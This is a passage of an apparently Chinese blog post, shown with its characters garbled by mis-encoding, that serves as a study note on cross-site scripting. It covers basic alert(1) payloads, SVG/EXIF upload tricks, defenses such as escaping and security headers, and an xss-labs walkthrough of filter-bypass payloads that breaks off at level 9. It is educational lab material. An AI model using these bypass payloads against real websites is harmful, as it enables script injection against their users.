å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥åŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œè€Œä¸ä¾èµ–äºæœåŠ¡å™¨ç«¯çš„æ•°æ®ã€‚ä¾‹å¦‚å®¢æˆ·ç«¯å¦‚ä» URL ä¸­æå–æ•°æ®å¹¶åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå¦‚æœç”¨æˆ·åœ¨å®¢æˆ·ç«¯è¾“å…¥çš„æ•°æ®åŒ…å«äº†æ¶æ„çš„ JavaScript è„šæœ¬ï¼Œè€Œè¿™äº›è„šæœ¬æ²¡æœ‰ç»è¿‡é€‚å½“çš„è¿‡æ»¤å’Œæ¶ˆæ¯’ï¼Œé‚£ä¹ˆåº”ç”¨ç¨‹åºå°±å¯èƒ½å—åˆ° DOM-based XSS æ”»å‡»ã€‚éœ€è¦ç‰¹åˆ«æ³¨æ„ä»¥ä¸‹çš„ç”¨æˆ·è¾“å…¥æº document.URLã€ location.hashã€ location.searchã€ document.referrer ç­‰ã€‚ ","date":"2025-05-09","objectID":"/study_xss/:2:3","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"ä»£ç è§£æ ","date":"2025-05-09","objectID":"/study_xss/:3:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"DOM\u0026HTMLæ ‡è®° æµè§ˆå™¨æ”¶åˆ°ä»£ç ï¼Œå…ˆæ„å»ºDOMæ ‘å’Œè§£æHTMLã€‚ HTMLæ ‡è®°è§£æä¸€èˆ¬æ¯”è¾ƒå¿«ï¼ŒåŒ…å«äº†å¼€å§‹ç»“æŸå±æ€§åå’Œå€¼ï¼Œè§£æä¹‹åæ„å»ºäº†æ–‡æ¡£æ ‘ã€‚ DOMæ ‘ä¸»è¦æ˜¯æè¿°æ–‡æ¡£çš„å†…å®¹ï¼Œå¯ä»¥ååº”æ ‡è®°ä¹‹é—´çš„å…³ç³»å’Œå±‚æ¬¡ç»“æ„ã€‚DOMèŠ‚ç‚¹è¶Šå¤šï¼Œæ„å»ºæ—¶é—´è¶Šé•¿ã€‚ä¸è¿‡æœ‰ä¸ªç‰¹åˆ«çš„ç‚¹ï¼Œæ¯”å¦‚åŠ è½½åˆ°ä¸€ä¸ªimgèµ„æºï¼Œä¼šè¯·æ±‚è¿™ä¸ªèµ„æºï¼Œå¹¶ä¸”ä¸‹è½½ï¼Œä½†æ˜¯æ•´ä¸ªè¿‡ç¨‹æ˜¯å¼‚æ­¥çš„ï¼Œæµè§ˆå™¨ä¼šç»§ç»­è§£æå’Œç”Ÿäº§HTMLéƒ¨åˆ†ï¼Œå¹¶ä¸ä¼šç­‰å¾…imgä¸‹è½½å®Œ ","date":"2025-05-09","objectID":"/study_xss/:3:1","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"JavaScriptçš„è§£æ é¡ºåºï¼šHTMLè§£æåˆ°JavaScriptéƒ¨åˆ†çš„æ—¶å€™ï¼ŒHTMLä¼šåœæ­¢è§£æï¼Œæ§åˆ¶æƒåˆ°JavaScriptå¼•æ“ï¼Œæ‰§è¡Œä»£ç åå†ç»§ç»­è§£æHTMLã€‚ ç¼ºç‚¹ï¼šå¦‚æœJavaScriptçš„ä»£ç è¿è¡Œè¿‡é•¿ï¼Œå°±ä¼šæœ‰è´Ÿé¢å½±å“ï¼Œæ‰€ä»¥å°±ä¼šæœ‰å¼‚æ­¥(async/await)å»å¤„ç†ã€‚å½“JavaScriptä»£ç æ‰§è¡Œæ—¶ï¼Œå¦‚æœè¯¥ä»£ç ä¿®æ”¹äº†DOMç»“æ„æˆ–æ ·å¼ï¼Œå¯èƒ½ä¼šè§¦å‘æµè§ˆå™¨é‡æ–°æ„å»ºDOMæ ‘å’Œåº”ç”¨æ ·å¼ï¼Œä»è€Œå¯¼è‡´é¡µé¢çš„é‡ç»˜å’Œå›æµï¼Œå½±å“é¡µé¢çš„æ€§èƒ½ã€‚ æµè§ˆå™¨æ–¹é¢ï¼šå½“é‡åˆ°\u003cscript\u003eæ ‡ç­¾ï¼Œå°±ä¼šåœæ­¢HTMLè§£æï¼Œè¿›è¡ŒJavaScriptè§£æã€‚é‡åˆ°URLåè®®oräº‹ä»¶å±æ€§çš„æ ‡è®°æ—¶ï¼Œäº¤ç»™JavaScriptå»è§£æï¼Œå¦‚æœè¿˜ä¸è¡Œå°±ä¼šæŠ¥é”™ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæœ‰æ—¶å€™åœ¨æŸä¸ªé¡µé¢æ’å…¥äº†XSSå¼¹çª—åï¼Œå‡å¦‚ä½ ä¸ç‚¹å‡»ä½ çš„å¼¹çª—çš„ç›¸åº”çš„æ“ä½œï¼ŒæŸäº›å…ƒç´ å°±æ— æ³•è¿›è¡ŒåŠ è½½ã€‚ ","date":"2025-05-09","objectID":"/study_xss/:3:2","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"CSSä»£ç çš„è§£æ åœ¨é‡åˆ°CSSä»£ç æ—¶ï¼Œæµè§ˆå™¨ä¸ä¼šåƒJavaScriptä»£ç ä¸€æ ·å»åœæ­¢HTMLæ ‡è®°çš„è§£æï¼Œç›¸åå®ƒä¼šç»§ç»­è¿›è¡ŒHTMLä»£ç çš„è§£æï¼Œå¹¶ä¸”å°†CSSä»£ç äº¤ç»™CSSå¼•æ“æ¥è¿›è¡Œå¤„ç†ã€‚ ","date":"2025-05-09","objectID":"/study_xss/:3:3","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"å…³äºè§£ç  HTMLä¸»è¦æ˜¯ä¸ºäº†é¿å…æ­§ä¹‰æ‰€ä»¥æ‰è§£ç çš„ï¼Œæ¯”å¦‚\u003c\u003eè¿™ç§ä¸œè¥¿å¯èƒ½æ˜¯æ ‡ç­¾orå±æ€§å€¼ï¼Œé‚£ä¹ˆä¼ é€’çš„æ—¶å€™åˆ©ç”¨ç¼–ç å°±ä¸ä¼šæœ‰æ­§ä¹‰äº†ï¼Œä¾‹å¦‚\u003cdiv\u003eâ€“\u003e\u0026#x003c;\u0026#x0064;\u0026#x0069;\u0026#x0076;\u0026#x003e;or\u0026#60;\u0026#100;\u0026#105;\u0026#118;\u0026#62;ã€‚ JavaScriptä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢æ¼æ´å’Œè¯­æ³•é”™è¯¯ï¼Œä¸€èˆ¬é‡åˆ°\u003cscript\u003eè¿™ç§ä¸œè¥¿å°±å›è¿›è¡ŒJSç¼–ç ï¼Œä½†æ˜¯\u003c \u003e ' \" ( )æ˜¯ä¸èƒ½JSç¼–ç çš„ ä¸¾ä¸ªæ —å­ï¼š\u003cimg src=# onerror=alert(1)\u003eï¼Œè§£ç ä¹‹åæ˜¯\u003cimg src=# onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)\u003eï¼Œè€Œä¸æ˜¯å…¨éƒ¨å»è§£ç  ","date":"2025-05-09","objectID":"/study_xss/:3:4","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"å®æˆ˜ ","date":"2025-05-09","objectID":"/study_xss/:4:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"å¸¸è§çš„åŸºç¡€çš„payload \u003cscript\u003ealert(1)\u003c/script\u003e \u003cimg scr=1 onerror=alert(1)\u003e \u003csvg onload=alert(1)/\u003e \u003ca href=javascript:alert(1)\u003exss\u003c/a\u003e and so on ","date":"2025-05-09","objectID":"/study_xss/:4:1","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"ä¸€èˆ¬åœºæ™¯ æœ‰æ¡†å°±æ’è¿›å»è¯•è¯•ï¼Œè®°å¾—F12é”å®šæ¡†å»çœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆã€‚ ","date":"2025-05-09","objectID":"/study_xss/:4:2","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"æ–‡ä»¶ä¸Šä¼ XSS ä¿®æ”¹æ–‡ä»¶åç¼€ï¼šbpæŠ“äº†ï¼Œä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™æŠŠåç¼€æ”¹æˆ.htmlor.htmï¼Œç„¶ååœ¨æ–‡ä»¶é‡Œé¢å»æ’å…¥XSSä»£ç  svgå†™å…¥XSSï¼šç®€å•æ¥è¯´å°±æ˜¯svgæ–‡ä»¶é‡Œé¢å»åµŒå…¥XSSä»£ç ï¼Œä¾‹å¦‚ \u003csvg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\"\u003e \u003ccircle cx=\"100\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"2\" fill=\"red\" /\u003e \u003cscript\u003ealert(1)\u003c/script\u003e \u003c/svg\u003e exifå†™å…¥XSSï¼šå‰æéœ€è¦ç½‘ç«™è§£æå›¾ç‰‡çš„exifä¿¡æ¯æ‰å¯ä»¥æˆåŠŸä½¿ç”¨æ­¤æ–¹æ³•ï¼Œexiftool -Comment=\"\u003cscript\u003ealert(1)\u003c/script\u003e filename.png\" ","date":"2025-05-09","objectID":"/study_xss/:4:3","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"PDF-XSS PDFç¼–è¾‘é‡Œé¢å¯ä»¥æ’å…¥XSSä»£ç ï¼Œå†™è¿›å»ç„¶åä¿å­˜æˆPDFæ–‡ä»¶ï¼Œä¼ åˆ°æµè§ˆå™¨ã€‚ä½†æ˜¯è¿™ä¸æ˜¯æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„ï¼Œåœ¨æœ¬åœ°å¼¹çª—çš„æ„ä¹‰ä¸å¤§ï¼Œæˆ‘ä»¬éœ€è¦è®©æŸä¸ªç½‘ç«™åœ¨çº¿è§£ææˆ–è€…æ‰“å¼€æˆ‘ä»¬åˆ¶ä½œå¥½çš„PDFæ–‡ä»¶æ‰å¯ä»¥ï¼Œå½“ç„¶é˜²å¾¡çš„æ–¹æ³•å°±æ˜¯ç”¨æˆ·åœ¨æ‰“å¼€PDFæ–‡ä»¶æ—¶å€™ï¼Œå¼ºåˆ¶è®©ç”¨æˆ·åœ¨æœ¬åœ°ä¸‹è½½æ‰“å¼€ã€‚ æ›´å¤šæ–¹æ³•çœ‹https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html ","date":"2025-05-09","objectID":"/study_xss/:4:4","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"å·¥å…· fuzzï¼šhttps://github.com/TheKingOfDuck/easyXssPayload XSStrikeï¼špython xsstrike.py -u http~ ","date":"2025-05-09","objectID":"/study_xss/:4:5","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"å…³äºé˜²å¾¡ ","date":"2025-05-09","objectID":"/study_xss/:5:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"é€»è¾‘æ–¹é¢ ä¸€èˆ¬çš„XSSï¼šè¿‡æ»¤/æŠŠHTMLå®ä½“åŒ–ç¼–ç ç‰¹æ®Šå­—ç¬¦:\u003c\u003e\"'ç­‰ æ–‡ä»¶ä¸Šä¼ XSSï¼šæ£€æŸ¥åç¼€ï¼Œå‰¥ç¦»exifæ ‡ç­¾ PDF-XSSï¼šå¼ºåˆ¶ç”¨æˆ·å¿…é¡»ä¸‹è½½æ–‡ä»¶ï¼Œè€Œä¸èƒ½åœ¨çº¿é˜…è¯» ","date":"2025-05-09","objectID":"/study_xss/:5:1","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"ä»£ç æ–¹é¢ PHPçš„htmlentities()orhtmlspecialchars() pythonçš„cgi.escape() ASPçš„Server.HTMLEncode() Javaçš„xssprotect nodejsçš„node-validator ","date":"2025-05-09","objectID":"/study_xss/:5:2","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"HTTPå¤´å±‚æ¬¡ X-XSS-Protection é€šè¿‡è®¾ç½®å…¶å€¼ä¸º1ï¼Œå¯ç”¨æµè§ˆå™¨çš„XSSé˜²æŠ¤ï¼Œæµè§ˆå™¨ä¼šåšå‡ºä¸‹é¢çš„æªæ–½ï¼š è‡ªåŠ¨å…³é—­æˆ–è¿‡æ»¤æ‰æ½œåœ¨çš„XSSæ”»å‡»è„šæœ¬ï¼šæµè§ˆå™¨ä¼šæ£€æµ‹å“åº”å†…å®¹æ˜¯å¦åŒ…å«æ¶æ„è„šæœ¬ï¼Œå¹¶è‡ªåŠ¨å…³é—­æˆ–è¿‡æ»¤æ‰è¿™äº›è„šæœ¬ï¼Œé˜²æ­¢å®ƒä»¬è¢«æ‰§è¡Œã€‚ é‡å®šå‘åˆ°å®‰å…¨é¡µé¢ï¼šå¦‚æœæµè§ˆå™¨æ£€æµ‹åˆ°å…·æœ‰æ½œåœ¨XSSå¨èƒçš„å†…å®¹ï¼Œå®ƒå¯èƒ½ä¼šå°†ç”¨æˆ·é‡å®šå‘åˆ°ä¸€ä¸ªæ›´å®‰å…¨çš„é¡µé¢ï¼Œä»¥é˜²æ­¢æ”»å‡»è„šæœ¬çš„æ‰§è¡Œã€‚ X-Download-Options é€šè¿‡è®¾ç½®å…¶å€¼ä¸ºnoopenï¼Œä½¿å¾—æµè§ˆå™¨ä¸‹è½½æ–‡ä»¶æ—¶ä¸è‡ªåŠ¨æ‰“å¼€ï¼Œä¸å…³è”ä¸‹è½½æ–‡ä»¶å’Œæµè§ˆå™¨å†…åµŒç¨‹åºã€‚è¿™æ ·å¯ä»¥é˜²æ­¢ä¸€äº›ç‰¹å®šç±»å‹çš„æ–‡ä»¶ï¼ˆä¾‹å¦‚htmlã€pdfç­‰ï¼‰è¢«å½“ä½œç½‘é¡µæ‰“å¼€ï¼Œé™ä½XSSæ”»å‡»çš„é£é™©ã€‚ X-Content-Type-Options é€šè¿‡è®¾ç½®X-Content-Type-Optionså¤´çš„å€¼ä¸º\"nosniff\"ï¼Œå¯ä»¥é˜²æ­¢æµè§ˆå™¨å°†å“åº”å†…å®¹ä»¥é”™è¯¯çš„æ–¹å¼è§£æï¼Œå‡å°‘äº†XSSæ”»å‡»çš„é£é™©ã€‚ X-Frame-Options é€šè¿‡è®¾ç½®X-Frame-Optionså¤´ï¼Œå¯ä»¥é˜»æ­¢é€šè¿‡åµŒå…¥iframeæˆ–frameçš„æ–¹å¼è¿›è¡Œç‚¹å‡»åŠ«æŒæ”»å‡»ã€‚å¯ä»¥è®¾ç½®è¯¥å¤´çš„å€¼ä¸º\"DENY\"ï¼Œ\"SAMEORIGIN\"æˆ–\"ALLOW-FROM \u003cåŸŸå\u003e\"ã€‚ Content Security Policyï¼ˆCSPï¼‰ é€šè¿‡è®¾ç½®CSPå¤´ï¼Œå¯ä»¥é™åˆ¶èµ„æºåŠ è½½çš„æ¥æºï¼Œä»¥é˜²æ­¢æ‰§è¡Œä¸å—ä¿¡ä»»çš„è„šæœ¬ã€‚CSPå¯ä»¥æŒ‡å®šå…è®¸çš„åŸŸåã€å…è®¸çš„è„šæœ¬ç±»å‹ä»¥åŠå…¶ä»–å®‰å…¨ç­–ç•¥ã€‚ ","date":"2025-05-09","objectID":"/study_xss/:5:3","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"HttpOnly å½“ä¸€ä¸ª cookie è®¾ç½®äº† HttpOnly æ ‡å¿—åï¼Œæµè§ˆå™¨ä¼šç¦æ­¢é€šè¿‡ JavaScript è„šæœ¬æ¥è¯»å–è¿™ä¸ª cookie çš„å€¼ã€‚è¿™æ„å‘³ç€å³ä½¿æœ‰ XSS æ”»å‡»æˆåŠŸæ³¨å…¥äº†æ¶æ„è„šæœ¬ï¼Œä¹Ÿæ— æ³•ä»å—å®³è€…æµè§ˆå™¨ä¸­è·å–æ•æ„Ÿçš„ cookie å€¼ï¼Œä»è€Œæœ‰æ•ˆé˜²æ­¢äº† cookie ç›—å–å’Œä¼šè¯åŠ«æŒæ”»å‡»ã€‚ ä½†æ˜¯HttpOnlyä¸èƒ½å¤Ÿå®Œå…¨é˜²å¾¡XSSï¼Œåªèƒ½å‡å°‘XSSå¸¦æ¥çš„å±å®³ã€‚ PHP setcookie('cookie_name', 'cookie_value', time()+3600, '/', '', false, true); // æœ€åä¸€ä¸ªå‚æ•°è®¾ç½®ä¸º true è¡¨ç¤ºè®¾ç½® HttpOnly æ ‡å¿—ï¼Œfalse è¡¨ç¤ºä¸è®¾ç½® Java import javax.servlet.http.Cookie; Cookie cookie = new Cookie(\"cookie_name\", \"cookie_value\"); cookie.setMaxAge(3600); cookie.setPath(\"/\"); cookie.setHttpOnly(true); // è®¾ç½® HttpOnly æ ‡å¿— response.addCookie(cookie); Pythonï¼ˆDjango æ¡†æ¶ï¼‰ response.set_cookie('cookie_name', 'cookie_value', max_age=3600, httponly=True) # è®¾ç½® httponly=True è¡¨ç¤ºè®¾ç½® HttpOnly æ ‡å¿— nodejs cnpm i xss -S const {xss} = require('xss') const newBlog = (blogData = {}) =\u003e { const title = xss(blogData.title) } ","date":"2025-05-09","objectID":"/study_xss/:5:4","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"XSS-lab ä¸€ä¸ªåŸºç¡€xssé¶åœºï¼Œåé¢4ä¸ªæ˜¯å…³äºflashçš„ï¼Œå°±ä¸å†™äº† ","date":"2025-05-09","objectID":"/study_xss/:6:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"å…³äºé¶åœºæ­å»º windowså¯ä»¥å°çš®æ­å»ºï¼Œmac/linuxæ¨èdocker docker run -d â€“name xss-labs -p 51142:80 shadowaura/xss-labs:latest ","date":"2025-05-09","objectID":"/study_xss/:6:1","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"level1~2 æ— ä»»ä½•é˜²å¾¡çš„ä¸¤å…³ level1 ç›´æ¥è¾“å…¥\u003cscript\u003ealert(1);\u003c/script\u003eå³å¯ level2 å…ˆæŠŠè€payloadè¾“å…¥è¿›å»ï¼Œå‘ç°ä¸è¡Œï¼Œå¹¶ä¸”payloadå›æ˜¾åœ¨ \u003cform action=\"level2.php\" method=\"GET\"\u003e \u003cinput name=\"keyword\" value=\"\u003cscript\u003ealert(1)\u003c/scrpit\u003e\"\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"æœç´¢\"\u003e \u003c/form\u003e ç”šè‡³å‘ç°è¿™ä¸ªå¹¶æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸»è¦æ˜¯å› ä¸ºæ²¡æœ‰é—­åˆå¯¼è‡´çš„ï¼ŒåŠ å…¥\"\u003e å³å¯ å®Œæ•´payloadï¼š\"\u003e \u003cscript\u003ealert(1)\u003c/script\u003e ","date":"2025-05-09","objectID":"/study_xss/:6:2","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"level3~9(å­—ç¬¦è¿‡æ»¤ç»•è¿‡) level3 æ³¨ï¼šphp8.1.0åŠå…¶ä»¥ä¸Šç‰ˆæœ¬å·²ç»ä¿®å¤ htmlspecialcharså‡½æ•°ï¼ŒæŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ \u0026ï¼šè½¬æ¢ä¸º\u0026 â€œï¼šè½¬æ¢ä¸º\" â€˜ï¼šè½¬æ¢ä¸ºæˆä¸º ' \u003cï¼šè½¬æ¢ä¸º\u003c â€˜\u003eï¼šè½¬æ¢ä¸º\u003e è¯­æ³•htmlspecialchars(string,flags,character-set,double_encode) stringï¼šå¿…éœ€ï¼Œè§„å®šè¦è½¬æ¢çš„å­—ç¬¦ä¸² flags ï¼šå¯é€‰ï¼Œè§„å®šå¦‚ä½•å¤„ç†å¼•å·ã€æ— æ•ˆçš„ç¼–ç ä»¥åŠä½¿ç”¨å“ªç§æ–‡æ¡£ç±»å‹ character-set ï¼šå¯é€‰ï¼Œä¸€ä¸ªè§„å®šäº†è¦ä½¿ç”¨çš„å­—ç¬¦é›†çš„å­—ç¬¦ä¸²ï¼Œå¦‚ï¼šUTF-8ï¼ˆé»˜è®¤ï¼‰ double_encode ï¼šå¯é€‰ï¼Œå¸ƒå°”å€¼ï¼Œè§„å®šäº†æ˜¯å¦ç¼–ç å·²å­˜åœ¨çš„ HTML å®ä½“ã€‚ flagså‚æ•°å¯ç”¨çš„å¼•å·ç±»å‹ ENT_COMPAT ï¼šé»˜è®¤ä»…ç¼–ç åŒå¼•å·ã€‚ ENT_QUOTESï¼šç¼–ç åŒå¼•å·å’Œå•å¼•å·ã€‚ ENT_NOQUOTESï¼šä¸ç¼–ç ä»»ä½•å¼•å·ã€‚ æ³¨ï¼šxss-labä¸­æœ‰äº›å…³å¡å¯ä»¥åˆ©ç”¨å•å¼•å·ç»•è¿‡æ˜¯å› ä¸ºflagså‚æ•°é»˜è®¤åªç¼–ç åŒå¼•å· double_encodeå‚æ•°å¸ƒå°”å€¼ TRUEï¼šé»˜è®¤ï¼Œå°†å¯¹æ¯ä¸ªå®ä½“è¿›è¡Œè½¬æ¢ã€‚ FALSEï¼šä¸ä¼šå¯¹å·²å­˜åœ¨çš„ HTML å®ä½“è¿›è¡Œç¼–ç ã€‚ è¿™é‡Œé¶åœºç”¨çš„æ˜¯htmlspecialchars($str)ï¼Œå°è¯•è¾“å…¥pyloadï¼Œå‘ç° \u003ch2 align=center\u003eæ²¡æœ‰æ‰¾åˆ°å’Œ\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;ç›¸å…³çš„ç»“æœ.\u003c/h2\u003e\u003ccenter\u003eï¼Œç„¶è€Œï¼Œå¯ä»¥å‘ç°è¿™é‡Œ value çš„å€¼ç”¨çš„æ˜¯å•å¼•å·ã€‚æ—¢ç„¶å•å¼•å·ä¸ä¼šè¢«è½¬ä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥é—­åˆ value è¿™ä¸ªå­—ç¬¦ä¸²ã€‚ ä½†æ˜¯ï¼Œ\u003c\u003e éƒ½ä¼šè¢«è½¬ä¹‰ï¼Œä¼¼ä¹ä¸èƒ½é—­åˆè¿™ä¸ªæ ‡ç­¾ã€‚æœ‰ä»€ä¹ˆåŠæ³•èƒ½å¤Ÿä¸ç”¨ \u003cscript\u003e æ ‡ç­¾æ¥æ³¨å…¥ JavaScript ä»£ç å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä½¿ç”¨è§¦å‘å™¨ï¼Œæ¯”å¦‚ onfocus æˆ–è€… onmouseoverã€‚ javascript:alert(1) ä½¿ç”¨äº†javaä¼ªåè®®ï¼Œå°±æ˜¯æŠŠjavascript: åé¢çš„ä»£ç å½“JavaScriptæ¥æ‰§è¡Œ onmouseover=javascript:alert(1) onfocus=javascript:alert(1) level4 payloadæ‰“è¿›å»ï¼Œå›æ˜¾\u003ch2 align=center\u003eæ²¡æœ‰æ‰¾åˆ°å’Œ\u0026lt;script\u0026gt;alert(1)\u0026lt;/scrpit\u0026gt;ç›¸å…³çš„ç»“æœ.\u003c/h2\u003e\u003ccenter\u003e æŠŠ\u003cç»™è¿‡æ»¤äº†ï¼ŒåŒå¼•å·æ²¡è¿‡æ»¤ï¼ŒæŠŠä¸Šä¸€ä¸ªä»£ç æ”¹ä¸€ä¸‹æ‰”è¿›å»è¯•è¯•ï¼Œåˆç† \" onmouseover=javascript:alert(1) \" level5 è€è§„çŸ©ï¼Œè¾“å…¥payloadï¼Œè¿”å›\u003ch2 align=center\u003eæ²¡æœ‰æ‰¾åˆ°å’Œ\u0026lt;script\u0026gt;alert(1)\u0026lt;/scrpit\u0026gt;ç›¸å…³çš„ç»“æœ.\u003c/h2\u003e\u003ccenter\u003eï¼Œ è€Œä¸”è¾“å…¥æ¡†ä¸­å˜æˆäº†\u003cscr_ipt\u003ealert(1)\u003c/scrpit\u003eï¼Œ è¾“å…¥\"\u003e\" onmouseover=javascript:alert(1) \"ï¼Œå‘ç°å˜æˆ\" o_nmouseover=javascript:alert(1) \"\"\u003e æ­£ç¡®æ€è·¯æ˜¯å¯ä»¥åˆ©ç”¨ JavaScript çš„ URI \u003ca href=javascript:alert(1)\u003ehack\u003c/a\u003e \u003ca\u003eæ ‡ç­¾åé¢çš„hrefä¸ä¸€å®šéè¦è·Ÿurlï¼Œè¿˜å¯ä»¥æ˜¯URIï¼Œå¯ä»¥è§†ä¸º URL çš„è¶…é›†ï¼Œåé¢è·Ÿjavascriptå°±å¯ä»¥æ‰§è¡Œåé¢çš„å†…å®¹ï¼Œmailtoå°±ä¼šå»æ‰“å¼€é‚®ä»¶å»å‘ä¿¡æ¯ï¼Œæ‰€ä»¥å¯ä»¥å€ŸåŠ©è¿™ä¸ªè¿è¡Œjsä»£ç  \"\u003e \u003ca href=javascript:alert(1)\u003ehack\u003c/a\u003e level6 å°è¯•payloadï¼Œå‘ç°å˜æˆ\u003cscr_ipt\u003ealert(1)\u003c/scrpit\u003eï¼Œå°è¯•5çš„payloadï¼Œå‘ç°å˜æˆ\u003ca hr_ef=javascript:alert(1)\u003ehack\u003c/a\u003e\"\u003eï¼Œå‘ç°hrefè¢«è¿‡æ»¤äº†ï¼Œè¯¾æºç ï¼Œ $str2=str_replace(\"\u003cscript\",\"\u003cscr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); å‘ç°è¿‡æ»¤äº†äº”ä¸ªä¸œè¥¿ï¼Œå¯ä»¥åˆ©ç”¨htmlçš„ç‰¹æ€§ï¼ŒHREFå’Œhrefçš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œå¤§å°å†™ä¸ä¼šåŒºåˆ† \"\u003e \u003ca HREF=javascript:alert(1)\u003ehack\u003c/a\u003e level7 å°è¯•è¾“å…¥payloadï¼Œå‘ç°å›æ˜¾\u003c\u003ealert(1)\u003c/scrpit\u003eï¼Œæ•´ä¸ªè¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œé‚£ä¹ˆ6çš„payloadå½“ç„¶ä¸èƒ½ä½¿ç”¨äº†ï¼Œçœ‹é¢˜ç›®æºç  $str2=str_replace(\"script\",\"\",$str); $str3=str_replace(\"on\",\"\",$str2); $str4=str_replace(\"src\",\"\",$str3); $str5=str_replace(\"data\",\"\",$str4); $str6=str_replace(\"href\",\"\",$str5); æœç„¶å…¨éƒ¨æ¢ä¸ºç©ºï¼Œä½†æ˜¯phpç‰¹æ€§ï¼Œæ›¿æ¢åªä¼šæ›¿æ¢ä¸€ä¸ªï¼Œæ¯”å¦‚\u003cscriscriptpt\u003eå°±ä¼šè¢«æ›¿æ¢ä¸º\u003cscript\u003eï¼Œè¿™å°±æ˜¯åŒå†™ç»•è¿‡ï¼Ÿ \"\u003e \u003cscriscriptpt\u003ealert(1)\u003c/scriscriptpt\u003e level8 å°è¯•åŸå§‹payloadï¼Œå‘ç°ä¼šè¢«æ›¿æ¢\u003cscr_ipt\u003ealert(1)\u003c/scr_ipt\u003eï¼Œå¹¶ä¸”æ˜¯é“¾æ¥å½¢å¼ï¼Œå¥½åƒæ²¡å•¥åŒºåˆ«ï¼Œçœ‹æºç  $str2=str_replace(\"script\",\"scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); $str7=str_replace('\"','\u0026quot',$str6); æ–°å¢çš„æ˜¯åŒå¼•å·è¢«è¿‡æ»¤äº†ï¼Œ \"\u003e \u003ca href=javascript:alert(1)\u003ehack\u003c/a\u003eè¿›å»å˜æˆ\u003ca hr_ef=javascr_ipt:alert(1)\u003ehack\u003c/a\u003eï¼Œhrefå¯ä»¥é€šè¿‡å¤§å†™ç»•è¿‡ï¼Œä½†æ˜¯javascriptæ€ä¹ˆæ HTML å®ä½“æœ‰ä¸¤ç§å†™æ³•ï¼Œç¬¬ä¸€ç§æ˜¯ \u0026entity_name; å½¢å¼ï¼Œæ¯”å¦‚ $lt; è¡¨ç¤ºå°äºå·ï¼Œâ€\u0026â€œå¼€å¤´ï¼Œâ€;â€œç»“å°¾ï¼›ç¬¬äºŒç§æ˜¯ \u0026#entity_number; å½¢å¼ï¼Œå…¶ä¸­ entity_number æ˜¯å­—ç¬¦çš„å®ä½“ç¼–å·ï¼Œæ¯”å¦‚ \u0026#60; ä¹Ÿèƒ½è¡¨ç¤ºå°äºå·ã€‚ä½¿ç”¨ç¬¬äºŒç§æ–¹å¼ï¼Œä»»ä½•å­—ç¬¦ï¼ˆåŒ…æ‹¬ ASCII å­—ç¬¦ï¼‰éƒ½æœ‰å…¶å®ä½“è¡¨ç¤ºã€‚https://mothereff.in/html-entities å¯ä»¥æä¾›è½¬æ¢ï¼Œâ€\u0026#â€œå¼€å¤´ï¼Œâ€;â€œç»“å°¾ çªç„¶æƒ³èµ·æ¥è¿™ä¸ªæ˜¯è¦åŠ å…¥åˆ°é“¾æ¥çš„ï¼ŒHREFä¸ç”¨å†™çš„ javascr\u0026#x69;pt:alert(1) level9 å°è¯•ä¸Šä¸€é¢˜çš„payloadï¼Œå›æ˜¾\u003ca 